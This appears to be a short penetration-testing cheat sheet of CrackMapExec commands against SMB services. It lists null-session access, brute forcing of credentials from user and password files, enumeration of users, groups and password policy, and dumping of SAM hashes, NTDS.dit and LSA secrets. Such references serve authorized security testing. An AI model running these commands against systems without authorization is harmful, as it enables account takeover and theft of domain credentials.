# CrackMapExec

## SMB

### Connecting using a null session

```bash
crackmapexec smb <ip> -u '' -p '' --shares
```

### Brute forcing credentials

```bash
crackmapexec smb <ip> -u <usersfile> -p <passwordsfile> | grep -v '\[-\]'
```

### Enumerating shares

```bash
crackmapexec smb <ip> -u <username> -p <password> --shares
```

### Enumerating users

```bash
crackmapexec smb <ip> -u <username> -p <password> --users
```

### Enumerating groups

```bash
crackmapexec smb <ip> -u <username> -p <password> --groups
```

### Enumerating password policy

```bash
crackmapexec smb <ip> -u <user> -p <password> --pass-pol
```

### Dumping SAM hashes

```bash
crackmapexec smb <ip> -u <username> -p <password> --sam
```

### Dumping NTDS.dit

```bash
crackmapexec smb <ip> -u <username> -p <password> --ntds
```

### Dumping LSA Secrets

```bash
crackmapexec smb <ip> -u <username> -p <password> --lsa
```